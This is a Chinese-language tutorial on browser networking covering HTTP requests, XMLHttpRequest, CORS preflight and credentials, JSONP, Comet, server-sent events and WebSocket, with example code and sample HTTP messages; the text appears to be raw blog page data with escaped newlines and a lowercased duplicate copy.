自定义头部字段Accept、Accept-Language、Content-Language、Content-Type，这些字段的值要安全和标准。\n   * 其中Content-Type字段值必须是text/plain、multipart/form-data、application/x-www-form-urlencoded之一。\n   * 至于Accept、Accept-Language和Content-Language是什么标准，可以查：网站1、网站2、网站3。\n\n简单请求的HTTP头部有个非常重要的源信息，它是存储在Origin字段里，它包含了请求页面的域名、端口和协议信息。如果服务器成功通过了这个请求，会在响应头部里使用Access-Control-Allow-Origin回发相同的源信息；如果访问的是公共资源，能被任意外域访问，那Access-Control-Allow-Origin得值就是'*'。\n\nfunction createCORSRequest(method, url, isAsyn) {\n    var xhr = new XMLHttpRequest();\n    // 检测XHR是否支持CORS，只需判断对象上是否有withCredentials属性\n    if ('withCredentials' in xhr) {\n        xhr.open(method, url, isAsyn);\n        return xhr;\n    }\n    return null;\n}\n// 这是一个简单请求\nvar request = createCORSRequest('GET', 'http://bar.other/resources/public-data/', true);\nif (request) {\n    request.onload = function() { }\n    request.send();\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n上面这个例子的简单请求的请求/响应报文可能如下：\n\n// 请求报文\nGET /resources/public-data/ HTTP/1.1\nHost: bar.other\nUser-Agent: Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.5; en-US; rv:1.9.1b3pre) Gecko/20081130 Minefield/3.1b3pre\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-us,en;q=0.5\nAccept-Encoding: gzip,deflate\nAccept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\nConnection: keep-alive\nReferer: http://foo.example/examples/access-control/simpleXSInvocation.html\nOrigin: http://foo.example   // 请求的头部信息\n\n// 响应报文\nHTTP/1.1 200 OK\nDate: Mon, 01 Dec 2008 00:23:53 GMT\nServer: Apache/2.0.61\nAccess-Control-Allow-Origin: *  // 访问的是公共资源\nKeep-Alive: timeout=2, max=100\nConnection: Keep-Alive\nTransfer-Encoding: chunked\nContent-Type: application/xml\n\n[XML Data]\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n\n\n\n# 3.3 非简单请求\n\n非简单请求就是除了上一节的简单请求以外的一些特殊HTTP请求，比如使用PATCH方法、DELETE方法、MIME类型的POST方法等。对于非简单请求，浏览器会先使用OPTIONS方法对服务器发起一个预检请求，服务器对预检请求信息进行检查（因为这类请求比简单请求不安全不标准，所以要预检），预检通过后服务器才会允许该源站发送实际的跨源请求（那就可以继续进行非简单请求了），并且还告知该源站以后是否需要携带身份凭证（HTTP认证相关数据和cookie）。\n\n预检请求的头部里依然有Origin，除了Origin还有两个重要字段Access-Control-Request-Method和Access-Control-Request-Headers。\n\n * Access-Control-Request-Method是告知服务器之后的实际跨域请求将使用什么方法（PATCH？POST？）。\n * Access-Control-Request-Headers是告知服务器之后的实际跨域请求将携带什么自定义请求头部字段。\n\n同样，服务器成功通过预检请求后，返回给浏览器的响应头部除了有Access-Control-Allow-Origin之外，还有三个重要字段：\n\n * Access-Control-Allow-Methods: 表明服务器允许客户端使用哪些方法。\n * Access-Control-Allow-Headers: 表明服务器允许携带那些自定义请求头部字段。\n * Access-Control-Max-Age: 是一个秒单位的数值，表明该非简单请求在这个时间内不用进行第二次预检了。\n\nfunction createCORSRequest(method, url, isAsyn) {\n    var xhr = new XMLHttpRequest();\n    // 检测XHR是否支持CORS，只需判断对象上是否有withCredentials属性\n    if ('withCredentials' in xhr) {\n        xhr.open(method, url, isAsyn);\n        // 自定义了两个头部字段，并会体现在`Access-Control-Request-Headers`字段里\n        xhr.setRequestHeader('X-PINGOTHER', 'pingpong');\n        xhr.setRequestHeader('Content-Type', 'application/xml');\n        return xhr;\n    }\n    return null;\n}\n// 这是一个非简单请求\nvar request = createCORSRequest('POST', 'http://bar.other/resources/post-here/', true);\nif (request) {\n    request.onload = function() { }\n    request.send('<?xml version=\"1.0\"?><person><name>Arun</name></person>');\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n预检的请求/响应报文\n\n// 请求报文\nOPTIONS /resources/post-here/ HTTP/1.1\nHost: bar.other\nUser-Agent: Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.5; en-US; rv:1.9.1b3pre) Gecko/20081130 Minefield/3.1b3pre\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-us,en;q=0.5\nAccept-Encoding: gzip,deflate\nAccept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\nConnection: keep-alive\n// 源信息\nOrigin: http://foo.example\n// 告知服务器，之后实际跨域请求，它使用的是POST方式\nAccess-Control-Request-Method: POST\n// 告知服务器，之后实际跨域请求里，我会携带X-PINGOTHER和Content-Type这两个自定义头部字段\nAccess-Control-Request-Headers: X-PINGOTHER, Content-Type\n\n// 响应报文\nHTTP/1.1 200 OK\nDate: Mon, 01 Dec 2008 01:15:39 GMT\nServer: Apache/2.0.61 (Unix)\n// 源信息\nAccess-Control-Allow-Origin: http://foo.example\n// 告知客户端，之后实际跨域请求可使用POST、GET、OPTIONS方法\nAccess-Control-Allow-Methods: POST, GET, OPTIONS\n// 告知客户端，之后实际跨域请求可携带X-PINGOTHER和Content-Type这两个自定义头部字段\nAccess-Control-Allow-Headers: X-PINGOTHER, Content-Type\n// 告知客户端，该非简单请求在24小时内不用进行第二次预检了\nAccess-Control-Max-Age: 86400\nVary: Accept-Encoding, Origin\nContent-Encoding: gzip\nContent-Length: 0\nKeep-Alive: timeout=2, max=100\nConnection: Keep-Alive\nContent-Type: text/plain\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n\n\n之后的实际跨域请求/响应报文：\n\nPOST /resources/post-here/ HTTP/1.1\nHost: bar.other\nUser-Agent: Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.5; en-US; rv:1.9.1b3pre) Gecko/20081130 Minefield/3.1b3pre\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-us,en;q=0.5\nAccept-Encoding: gzip,deflate\nAccept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\nConnection: keep-alive\nX-PINGOTHER: pingpong\nContent-Type: text/xml; charset=UTF-8\nReferer: http://foo.example/examples/preflightInvocation.html\nContent-Length: 55\nOrigin: http://foo.example\nPragma: no-cache\nCache-Control: no-cache\n\n<?xml version=\"1.0\"?><person><name>Arun</name></person>\n\n\nHTTP/1.1 200 OK\nDate: Mon, 01 Dec 2008 01:15:40 GMT\nServer: Apache/2.0.61 (Unix)\nAccess-Control-Allow-Origin: http://foo.example\nVary: Accept-Encoding, Origin\nContent-Encoding: gzip\nContent-Length: 235\nKeep-Alive: timeout=2, max=99\nConnection: Keep-Alive\nContent-Type: text/plain\n\n[Some GZIP'd payload]\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n\n\n\n# 3.4 带凭据的请求\n\n默认情况下，对于跨域XMLHttpRequest请求，浏览器不会发送身份凭证信息。如果要发送（预检结果告诉你下次请求要带凭证），可以将withCredentials属性设置为true，让请求携带凭证信息传给服务器。服务器也接收带凭证的请求，会将Access-Control-Allow-Credentials:true添加到响应头部信息里。\n\nfunction createCORSRequest(method, url, isAsyn) {\n    var xhr = new XMLHttpRequest();\n    // 检测XHR是否支持CORS，只需判断对象上是否有withCredentials属性\n    if ('withCredentials' in xhr) {\n        xhr.open(method, url, isAsyn);\n        // 发送的请求里携带了身份凭证信息\n        xhr.withCredentials = true;\n        return xhr;\n    }\n    return null;\n}\nvar request = createCORSRequest('GET', 'http://bar.other/resources/credentialed-content/', true);\nif (request) {\n    request.onload = function() { }\n    request.send();\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n而浏览器发的请求带了凭证，但服务器没有Access-Control-Allow-Credentials，那最终js会获取不到这个响应信息（response为空），并会触发onerror事件。\n\n\n# 四、其他跨域技术\n\n\n# 4.1 图像Ping\n\n一个网页可以从任何网页中加载图像，不用担心跨域问题。动态创建图像，使用它们的onload和onerror事件处理程序是否接收到响应。\n\n动态创建图像常使用图像Ping，请求的数据是通过查询字符串形式发送的，而响应可以是任意内容（通常是像素图或204响应）。不过它只能发送GET请求，无法访问服务器的响应文本，也就是说它是单向的数据传输。\n\n通过图像Ping，浏览器得不到任何具体的数据，但通过侦听load和error事件，它能知道响应是什么时候接收到的。\n\nvar img = new Image();\nimg.onload = img.onerror = function(){\n    alert(\"Done!\");\n}\n// 发送了一个name参数，图像Ping常用于跟踪用户点击次数\nimg.src = \"http://www.example.com/test?name=Nicholas\";\n\n\n1\n2\n3\n4\n5\n6\n\n\n\n# 4.2 JSONP\n\nJSONP（JSON with padding）是填充式JSON或参数式JSON，讲一个回调函数追加到跨域访问的地址后面，再这个字符串放到<scipt>标签的src属性里，在页面加载这个<script>时（和图像Ping类似，可从任何网址加载脚本），会对服务器发起请求，当响应达到时，回调函数会被触发，回调函数里的参数就是response响应数据。\n\nfunction handleResponse(response) {\n    console.log('response.ip', response.ip);\n    console.log('response.city', response.city);\n    console.log('response.region_name', response.region_name);\n}\nvar script = document.reateElement(\"script\");\n// 将jsonp放入到跨域地址后面\nscript.src = \"http://freegeoip.net/json?callback=handleResponse\";\ndocument.body.insertBefore(script, document.body.firstChild);\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\nJSONP相比于图像Ping类，它能够直接访问响应文本（response），是双向的。但如果服务器不安全，响应中可能夹带恶意代码；还有确定JSONP请求是否失败并不容易，有可能需要定时器来监视。\n\n\n# 4.3 Comet\n\nAjax是页面向服务器请求数据，而Comet是一种服务器向页面推送数据的技术。Comet（服务器推送）有两种实现：长轮询和流。\n\n短轮询（也叫常规轮询），浏览器定期发送请求给服务器，服务器会将目前为止的数据作为响应传递给浏览器（不管该数据是否有效）。服务器会一直被动接收请求，还得必须作出响应，尽管可能是无效的响应，这非常消耗服务器的性能。\n\n\n\n而长轮询，浏览器发送一个请求，服务器虽然始终处于连接打开，但是没有新数据是不会推送数据给浏览器，直到有新数据可发送才会去推送。服务器掌握了主动权，只发送有效的数据，这很节省服务器资源。无论是短轮询还是长轮询，浏览器在接收数据之前，都会先发起对服务器的连接。\n\n\n\n流就是HTTP流，它在页面的整个生命周期内只使用一个HTTP连接。浏览器向服务器发送一个请求，服务器就会一直保持连接打开，并周期性向浏览器推送数据。（长轮询本质还是一个个HTTP连接，流就只有一个，且readyState大部分时间是3）。流常用于服务器将输出缓存内容一次性全部发送给客户端。\n\nfunction createStreamingClient(url, progress, finished) {\n    var xhr = new XMLHttpRequest();\n    var received = 0; // 处理了多少个字符\n    xhr.open('GET', url, true);\n    xhr.onreadystatechange = function() {\n        var result;\n        if (xhr.readyState == 3) {\n            result = xhr.responseText.substring(received);\n            received += result.length; // 每次递增\n            progress(result);\n        } else if (xhr.readyState == 4) {\n            finished(xhr.responseText);\n        }\n    }\n    xhr.send(null);\n    return xhr;\n}\nvar client = createStreamingClient('streaming.php', function(data) {\n    console.log(\"Received：\" + data);\n}, function() {\n    console.log(\"Done!\");\n});\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n\n\n管理Comet连接是很容易出错的，随着时间的推移，社区为Comet提供了两个新的API来完善以前的问题。\n\n\n# 4.4 服务器发送事件\n\nSSE（Serve-Sent Events，服务器发送事件）是用于创建服务器到浏览器的单向连接，服务器可以通过这个连接发送任意数量的数据。服务器响应的MIME类型必须是text/event-strean，而且数据输出要能被js的API解析。\n\n使用SSE时要订阅新的事件流，实例化EventSource，并将一个URL作为第一个参数，如果要跨域那第二参数应该是{withCredentials: true}。\n\nEventSource实例对象有个readyState属性，值为0表示正在连接，1表示连接成功，2表示连接关闭了。如果你非要关闭连接，可以使用close()方法，但是你想重新使用EventSource，只能重新实例化EventSource（订阅新的事件流）。\n\nEventSource还有三个事件：\n\n * open：在建立连接时触发。\n * message：在从服务器接收到新事件时触发，事件回调有个event参数，该参数有个data属性，该属性就是服务器返回的数据（字符串）。\n * eror：在无法建立连接时触发。\n\n// 异步的EventSource\nlet eventSource = new EventSource(\"/events/subscribe\", {withCredentials: true});\neventSource.onmessage = function(event) {\n    // json形式的：{\"user\":\"Bob\",\"message\":\"First line\\n Second line\"}\n    console.log(\"message\", event.data);\n};\n\n\n1\n2\n3\n4\n5\n6\n\n\n响应格式可能是纯文本的，最简单的情况是每个数据项都带有前缀data:，例如：\n\ndata: foo\n\ndata: bar\n\ndata: foo\ndata: bar\n\n\n1\n2\n3\n4\n5\n6\n\n\n上面这样的文本，在之前代码的console.log(\"message\", event.data)，会输出三次，第一次是foo，第二次是bar，第三次是foo\\nbar。data:是相邻两行，那么它们将作为一条message返回，中间会插入\\n换行符（对应服务器生成流时也只用一个\\n）。如果data:之间有空行，它们会作为两条message返回（对应服务器生成流时用两个\\n）。\n\nSSE支持短轮询、长轮询和HTTP流，而且能在断开连接时自动确定何时重新连接，服务器可设置延迟响应时间retry: 3000。\n\n为了正确地重新连接，每一条消息都应设置一个id，具体是通过前缀id:来给message添加id的，这个id: 1紧挨着data:上一行或下一行都可以。而浏览器收到带有id的message时，EventSource实例对象会有个lastEventId属性，它就是id的具体值。\n\nid: 1\ndata: foo\n\ndata: bar\nid: 2\n\nid: 3\ndata: foo\ndata: bar\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n如果断开连接，会向服务器发送一个包含Last-Event-ID字段的特殊头部的请求，以便服务器知道下一次该触发哪个事件（保证浏览器能接收到顺序正确的数据）。\n\n\n# 4.5 Web Socket\n\nWeb Socket是在一个单独的持久连接上提供全双工、双向通信，http协议升级到web socket协议（服务器要使用专门支持这种协议的服务器）。未加密的连接不再是http://而是ws://；加密连接也不再是https://而是wss//。\n\n可以对比一下WebSocket和EventSource：\n\nWEBSOCKET          EVENTSOURCE\n双向：客户端和服务端都能交换消息   单向：仅服务端能发送消息\n二进制和文本数据           仅文本数据\nWebSocket 协议       常规 HTTP 协议\n\nWebSocket协议能让客户端与服务端之间发送非常少量的数据，而不用担心HTTP那样字节级的开销。由于WebSocket传递的数据包很小，所以它非常适合移动应用，可以最大程度解决宽带和网络延迟的问题。\n\n使用WebSocket，得先实例化WebSocket，并传入连接的URL。同源策略对WebSocket不适用（没有跨域限制），因此可以通过它打开任何站点的连接。\n\n实例化WebSocket后，浏览器会立马尝试创建连接。WebSocket实例对象也有一个readyState属性：\n\n * WebSocket.CONNECTING，值是0：正在建立连接\n * WebSocket.OPEN，值是1：已经建立连接\n * WebSocket.CLOSING，值是2：正在关闭连接\n * WebSocket.CLOSED，值是3：已经关闭连接\n\nWebSocket还有4个事件：\n\n * open：在成功建立连接时触发。\n * message：在接收到数据时触发。\n * error：在发生错误时触发，连接不能持续了。\n * close：在连接关闭时触发。\n\n使用WebSocket发送数据是send(param)方法，param就是要发送的数据，param只能是纯文本，如果是对象就要使用JSON.stringify(param)进行转换（序列化）。使用WebSocket接收数据，在message事件的回调函数中，该函数的参数event，这个event的data属性就是返回数据，该数据是穿文本字符串，一般使用前要经过JSON.parse()进行转换。\n\n一个较为完整的例子：\n\nvar socket = new WebSocket(\"wss://www.example.com/server.php\");\n\n// 连接已建立\nsocket.onopen = function(e) {\n    // 因为连接的建立是异步的，所以得保证连接建立了才发送请求。\n    // 如果参数是对象，要转换为JSON字符串\n    socket.send(JSON.stringify({name: 'Bob'}));\n};\n// 接收到数据\nsocket.onmessage = function(event) {\n    // 返回的event.data是JSON字符串，需要转换为对象\n    var data = JSON.parse(event.data);\n    console.log(`接收到数据：${data}`);\n};\n// 连接关闭，当我们不再使用WebSocket可以关闭它：socket.close([code], [reason])\nsocket.onclose = function(event) {\n    if (event.wasClean) {\n        // 正常关闭，code一般为1000\n        console.log(`WebSocket连接正常关闭， code=${event.code} reason=${event.reason}`);\n    } else {\n        // 服务器进程被杀死或网络中断，event.code 通常为 1006\n        console.log(`WebSocket连接丢失， code=${event.code} reason=${event.reason}`);\n    }\n};\n// 连接发生错误\nsocket.onerror = function(error) {\n  console.log(`WebSocket发生了错误：${error.message}`);\n};\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n",normalizedContent:"# http、ajax和跨域\n\n\n# 一、http请求概述\n\n\n# 1.1 输入一个url回车\n\n在浏览器地址栏里输入一个url然后按下回车，会发生以下事情：\n\n * dns解析，建立tcp连接（三次握手），发送http请求。\n * server接收http请求，处理并返回。\n * 客户端接收到返回数据后，处理数据（如渲染页面，执行js）。\n\n\n# 1.2 简单说明\n\n打开浏览器，按下f12会打开浏览器控制台，查看控制台的network页签。然后在浏览器地址栏里输入www.baidu.com并回车。\n\n 1. dns解析：dns（域名系统）拿到https://www.baidu.com，将它解析成一个ip地址，例如180.101.49.11:443。这个ip地址就是百度某个服务器的ip地址。443是https的默认端口，80是http默认端口。dns解析是dns客户端向dns服务器端发送一份查询报文也就是域名等，dns服务器端会返回一份报文也就是ip地址等。\n    \n    \n\n 2. 建立tcp连接：也就是三次握手。第一次握手，客户端询问服务端“你是否可用”；第二次握手，服务端告知客服端“我可用”；第三次握手，客户端告知服务端“我即将访问你”。\n\n 3. 发送http请求：大多发送的是get或者post请求，可以是url直链请求也可以使用ajax异步发送请求。\n\n 4. server处理请求：确认访问权限，处理好业务逻辑之后会返回响应。\n    \n    // node.js处理请求\n    const http = require('http');\n    const server = http.createserver((req, res) => {\n        console.log('req.method', req.method);\n        console.log('req.url', req.url);\n        res.end('hello');\n    });\n    server.listen(8000);\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    \n\n 5. 接收响应：客户端处理响应，比如加载返回的js、css文件并执行它们。\n\n\n# 二、xmlhttprequest对象\n\n\n# 2.1 xhr的使用\n\najax是asynchronous javascript and xml的缩写，表示异步的javascript+xml。ajax是一门浏览器与服务器的通信技术，它的特点是无需刷新页面即可从服务器取得数据（请求然后响应最后修改dom，无需刷新页面），它的核心是xmlhttprequest对象（简称xhr），前端人员可以使用这个对象进行服务器数据请求。需要注意的是，它名称虽然包含xml，但其实与数据格式无关（可能是纯文本、xml、json）。\n\n// 先实例化它，原生xmlhttprequest，没有参数\nvar xhr = new xmlhttprequest();\n\n\n1\n2\n\n\n实例化xmlhttprequest之后，我们就可以准备发送一个请求了，先配置请求信息（仅配置），再发送请求（建立连接）。\n\n * 使用xhr.open()进行配置。该方法接收三个参数，第一个参数是什么类型的请求，比如是\"get\"还是\"post\"（最好都大写）；第二个参数是请求地址，比如http://localhost/test.txt；第三个参数是是否异步发送请求，一般是true（可以不传，默认值就是true）。\n * 发送请求使用xhr.send(param)，get请求是没有param的，post是有param的，param是请求主体发送的数据（request body）。\n\n// 配置请求信息\nxhr.open(\"get\", \"http://localhost/test.txt\", true);\n// 发送请求。get是没有param，post是有param的，param是request body\nxhr.send(param)\n\n\n1\n2\n3\n4\n\n\n发送请求过后，因为一般是异步的，所以我们要知道请求/响应到了什么阶段，xhr的readystate属性就记录这些信息：\n\n * 0：未初识化。尚未调用open()方法。常定义unsent = 0; // 初始状态。\n * 1：启动。已经调用open()方法，但尚未调用send()方法。常定义opened = 1; // open被调用。\n * 2：发送。已经调用send()方法，但尚未接收到响应。常定义headers_received = 2; // 接收到response header。\n * 3：接收。已经接收到部分响应数据。常定义loading = 3; // 响应正在被加载。\n * 4：完成。已经接收到全部响应数据。常定义done = 4; // 请求完成。\n\n并且readystate的值每次变化时都会触发readystatechange事件。那前端人员就可以监听这个事件，再配合readystate的为4，就可以判断何时去处理响应。\n\nxhr.onreadystatechange = function() {\n    // 已经接收到全部响应数据\n    if (xhr.readystate == 4) {\n        // 处理响应\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n\n\n浏览器收到服务器的响应后，会填充xhr对象的属性。相关属性如下：\n\n * responsetext（新脚本是response）：作为响应主体被返回的文本（不管什么数据类型）。\n * responsexml（这是旧脚本）：如果响应的内容类型是text/xml或application/xml，这个属性中将保存包含着响应数据的xml dom文档。\n * status：响应额http状态。\n * statustext：http状态的说明，作为参考，一般不作为后续js判断。\n\n前端人员需要在响应返回后，拿到这个xhr对象做校验和业务逻辑处理（处理响应）。校验就是判断状态码也就是status属性，是[200, 300)以及304都是这次请求成功的标志。\n\n// `[200, 300)`以及`304`是请求成功\nif ((xhr.status >= 200 && xhr.status <300 ) || xhr.status == 304) {\n    alert(xhr.responsetext);\n} else {\n    alert('request was unsuccessful: ' + xhr.status);\n}\n\n\n1\n2\n3\n4\n5\n6\n\n\n如果在接收响应前想取消异步请求（终止请求），可以使用xhr.abort()方法，来停止xhr对象的事件触发，并且不能访问到与响应有关的属性。\n\n因为技术的进步，responsetext和responsexml都比较老旧了，它们常被response替代，并且还常使用xhr.responsetype来设置响应格式：\n\n * \"\"：同\"text\"。\n * \"text\"：response是domstring对象中的文本。\n * \"arraybuffer\"：response是一个包含二进制数据的arraybuffer。\n * \"blob\"：response是一个包含二进制数据的blob对象。\n * \"document\"：response 是一个 html document 或 xml xmldocument，根据接收到的数据的mime类型而定。\n * \"json\"：response是通过将接收到的数据内容解析为json，从而创建js对象。\n\n这一节最后，我们写一个比较完整的例子：\n\n// 配置请求信息\nvar xhr = new xmlhttprequest();\n// 配置请求信息\nxhr.open(\"get\", \"/blog/xmlhttprequest/json\", true);\n// 设置响应格式，我们用常用的json格式\nxhr.responsetype = 'json';\n// 发送请求。get是没有param\nxhr.send()\n// 监听readystate的变化，readystate为4去处理响应\nxhr.onreadystatechange = function() {\n    // readystate为4，表示已经接收到全部响应数据，可以开始处理响应信息了\n    if (xhr.readystate == 4) {\n        // 响应状态码status为[200, 300)以及304是请求成功\n        if ((xhr.status >= 200 && xhr.status <300 ) || xhr.status == 304) {\n            // 写法一，这是旧脚本的写法\n            console.log('xhr.responsetext', xhr.responsetext);\n            // 写法二，这是新脚本的写法，返回的是json并且还转为了js对象\n            console.log('xhr.response', xhr.response);\n        } else {\n            console.log(('request was unsuccessful: ' + xhr.status);\n        }\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n\n\n\n# 2.2 进度事件\n\n进度事件（progress events）定义了与客户端服务器通信有关的事件：\n\n * progress：在接收响应期间持续不断地触发。例如下载进度。\n * error：在请求发生错误时触发。例如网络中断或者无效的url。\n * load：在接收到完整的响应数据时触发。即使xhr.status为400或500等。\n * abort：在因为调用abort()方法而终止连接时触发。\n * loadstart：在接收到响应数据的第一个字节时触发。\n * loadend：在通信完成或触发error、abort或load事件后触发。\n * timeout：请求超时。可以在请求发送前设置xhr.timeout=30000。\n\n前三个用的比较多，也经常使用load事件来替代readystatechange事件，当然内部还是继续搭配xhr.status状态码判断返回结果。\n\nprogress常用作进度指示器，监听的回调函数有个event参数，他有三个参数，lengthcomputable、position和totalsize，分别表示“进度信息是否可用”、“已接收的字节数”和“根据content-length响应头部确定的预期字节数”。后两个参数在现如今的js中应该是loaded和total了（意思还是一样的），position和totalsize可能或许还会存在。\n\nvar xhr = new xmlhttprequest();\n// 下载一个文件\nxhr.open('get', '/blog/xmlhttprequest/load', true);\nxhr.send();\n// 请求收到了完整的响应\nxhr.onload = function(){\n    if ((xhr.status >= 200 && xhr.status < 300) || xhr.status == 304) {\n        // 写法一，这是旧脚本的写法\n        console.log('xhr.responsetext', xhr.responsetext);\n        // 写法二，这是新脚本的写法\n        console.log('xhr.response', xhr.response);\n    } else {\n        console.log('xhr.status', xhr.status);\n        console.log('xhr.statustext', xhr.statustext);\n    }\n}\n// 接收响应期间一直不断的触发该事件\nxhr.onprogress = function(event) {\n    if (event.lengthcomputable) {\n        // 写法一，这是旧脚本的写法\n        console.log(`received ${event.position} of ${event.totalsize} bytes`);\n        // 写法二，这是新脚本的写法\n        console.log(`received ${event.loaded} of ${event.total} bytes`);\n    }\n}\n// 请求失败，断网或者url错误\nxhr.onerror = function() {\n    console.log('request failed');\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n\n\n\n# 2.3 头部信息和post请求\n\n每个http请求和响应都会带有一个头部信息（请求头部和响应头部），我们来了解一下默认的浏览器头部信息：\n\n * accept：浏览器能够处理的内容类型。\n * accept-charset：浏览器能够显示的字符集。\n * accept-encoding：浏览器能够处理的压缩编码。\n * accept-language：浏览器当前设置的语言。\n * connection：留恋其与服务器之连接的类型。\n * cookie：当前页面设置的任何cookie。\n * host：发出请求的页面所在域。\n * refere：发出请求的页面的uri。（http规范拼错了单词，本来应该是referre，以规范为主）\n * user-agent：浏览器的用户代理字符串。\n\n我们不建议修改默认的浏览器头部信息，但可以使用自定义的头部信息，xhr.setrequestheader(xxx, yyyy)，xxx是字段名，yyy是值。要注意的是setrequestheader()方法必须得在open()和send()之间使用。\n\nxhr.open(\"get\", \"http://localhost/test.txt\", true);\nxhr.setrequestheader('myheader', 'myvalue');\nxhr.send(null);\n\n\n1\n2\n3\n\n\n我们可以获取响应头部信息，使用xhr.getresponseheader(xxx)获取单个，xhr.getallresponseheader()获取全部响应头部信息。\n\nget请求，是将简单传参数据放到了url的末尾，但必须经过encodeuricomponent()进行编码之后才能放到url的末尾，所有的键值对儿都必须由&进行分隔。\n\nxhr.open('get', 'example.php?name1=value1&name2=value2&name3=value3'， true);\n// 向现有url的末尾添加查询字符串参数\nfunction addurlparam(url, name, value)() {\n    // 含有?那就追加&，还不含有?那就加追?\n    url += (url.indexof('?') == -1 ? '?' : '&');\n    // 添加?或&就可以添加键值对儿了\n    url += encodeuricomponent(name) + '=' encodeuricomponent(value);\n    return url;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\npost请求，是将较为复杂数据作为了请求的主体提交的，这些数据大概率会被服务器保存，属于重要数据。这些数据是放在send()的入参里，数据格式通常是multipart/form-data、json、xml。\n\n特别注意，很久以前的表单数据传递要设置xhr.setrequestheader('content-type', 'application/x-www-form-urlencoded')。而在后来，定义了一个新类型formdata，简化了表单数据序列化，也不用再手动设置content-type头部信息。\n\nformdata方式（其实就是multipart/form-data）：\n\n// formdata序列化表单，创建与表单格式相同的数据\nvar data = new formdata(document.forms[0]);\n// 追加新的键值对\ndata.append(\"name\", \"javascript\");\nvar xhr = new xmlhttprequest();\nxhr.open(\"post\", \"example.php\", true);\n// 使用formdata后无需设置content-type头部信息\n// xhr.setrequestheader('content-type', 'application/x-www-form-urlencoded');\n// 发送请求\nxhr.send(data);\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\njson形式：\n\nvar xhr = new xmlhttprequest();\n// 转为json字符串\nvar json = json.stringify({ name: \"bob\", age: 8});\nxhr.open(\"post\", 'example.php', true)\n// 这里不要忘了，这不同于formdata，这个得手动设置\nxhr.setrequestheader('content-type', 'application/json; charset=utf-8');\nxhr.send(json);\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n\n# 2.4 上传\n\n上传请求比较特殊，它的上传进度不是xhr.onprogress而是xhr.upload.onprogress，并且其他常用的事件都是在xhr.upload上。\n\n<!doctype html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"utf-8\">\n    <title>document</title>\n</head>\n<body>\n    \x3c!-- 文件上传 --\x3e\n    <input type=\"file\" onchange=\"upload(this.files[0])\">\n    <script type=\"text/javascript\">\n        function upload(file) {\n            var xhr = new xmlhttprequest();\n            // 上传进度\n            xhr.upload.onprogress = function(event) {\n                console.log(`uploaded ${event.loaded} of ${event.total}`);\n            };\n            // 请求收到了完整的响应\n            xhr.onload = function(){\n                if ((xhr.status >= 200 && xhr.status < 300) || xhr.status == 304) {\n                    console.log('xhr.response', xhr.response);\n                } else {\n                    console.log('xhr.status', xhr.status);\n                    console.log('xhr.statustext', xhr.statustext);\n                }\n            }\n            // 请求失败\n            xhr.onerror = function() {\n                console.log('request failed');\n            }\n            xhr.open(\"post\", \"/blog/xmlhttprequest/upload\");\n            xhr.send(file);\n        }\n    <\/script>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n\n\n\n# 三、跨域资源共享\n\n\n# 3.1 cors\n\n使用ajax技术有个限制，那就是不能跨域进行请求（跨域也叫跨源），它只能访问相同域名、相同端口、相同协议的资源（同源）。\n\ncors（cross-origin resource sharing）是由w3c推出的一个基于http头部的跨域资源共享技术。cors新增了一组的http头部字段，存储着预检请求信息或源信息；cors也让服务器声明了哪些源站有权访问哪些资源（判断标准），接收请求时服务器会拿到源信息，并以这个标准作为判断依据；另外，对于非简单请求会先进行预检，拿到预检请求信息判断是否安全标准，在通过预检后才能进行实际的跨域请求。\n\n\n# 3.2 